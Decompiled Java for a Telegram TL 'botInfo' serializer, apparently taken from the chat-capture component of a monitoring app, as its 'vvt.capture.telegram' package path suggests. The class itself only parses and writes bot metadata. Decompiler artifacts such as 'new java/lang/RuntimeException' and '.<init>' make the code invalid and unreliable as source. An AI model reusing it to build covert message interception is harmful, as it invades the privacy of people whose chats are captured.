package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_botInfo
  extends TLRPC.BotInfo
{
  public static int constructor = 164583517;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 0;
    String str = null;
    int j = paramAbstractSerializedData.readInt32(paramBoolean);
    this.user_id = j;
    j = paramAbstractSerializedData.readInt32(paramBoolean);
    this.version = j;
    Object localObject1 = paramAbstractSerializedData.readString(paramBoolean);
    this.share_text = ((String)localObject1);
    localObject1 = paramAbstractSerializedData.readString(paramBoolean);
    this.description = ((String)localObject1);
    j = paramAbstractSerializedData.readInt32(paramBoolean);
    int k = 481674261;
    Object localObject2;
    if (j != k)
    {
      if (paramBoolean)
      {
        localObject2 = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        localObject1 = Integer.valueOf(j);
        arrayOfObject[0] = localObject1;
        str = String.format("wrong Vector magic, got %x", arrayOfObject);
        ((RuntimeException)localObject2).<init>(str);
        throw ((Throwable)localObject2);
      }
    }
    else {
      j = paramAbstractSerializedData.readInt32(paramBoolean);
    }
    for (;;)
    {
      if (i < j)
      {
        k = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject2 = TLRPC.TL_botCommand.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
        if (localObject2 != null) {}
      }
      else
      {
        return;
      }
      ArrayList localArrayList = this.commands;
      localArrayList.add(localObject2);
      i += 1;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.user_id;
    paramAbstractSerializedData.writeInt32(i);
    i = this.version;
    paramAbstractSerializedData.writeInt32(i);
    Object localObject = this.share_text;
    paramAbstractSerializedData.writeString((String)localObject);
    localObject = this.description;
    paramAbstractSerializedData.writeString((String)localObject);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.commands.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    localObject = null;
    for (int k = 0; k < j; k = i)
    {
      localObject = (TLRPC.TL_botCommand)this.commands.get(k);
      ((TLRPC.TL_botCommand)localObject).serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_botInfo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */